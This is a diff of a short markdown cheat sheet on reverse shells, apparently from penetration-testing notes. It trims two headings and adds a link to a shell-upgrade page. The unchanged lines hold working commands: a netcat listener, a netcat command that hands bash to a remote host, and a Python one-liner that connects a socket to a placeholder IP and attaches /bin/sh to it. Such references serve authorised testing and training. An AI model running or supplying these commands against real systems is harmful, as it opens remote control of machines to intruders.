@@ -1,12 +1,12 @@
 # Reverse shell
 
-Start listening on host computer with netcat:
+On host:
 
 ```bash
 nc -lvnp <port>
 ```
 
-General reverse shell options on target:
+General options on target:
 
 ```bash
 nc <ip> <port> -c bash
@@ -24,3 +24,4 @@ nc <ip> <port> -c bash
 python -c 'import socket,subprocess,os;s=socket.socket(socket.AF_INET,socket.SOCK_STREAM);s.connect(("<ip>",<port>));os.dup2(s.fileno(),0); os.dup2(s.fileno(),1); os.dup2(s.fileno(),2);p=subprocess.call(["/bin/sh","-i"]);'
 ```
 
+See [upgrade-dumb-shell](upgrade-dumb-shell.md) for upgrading.
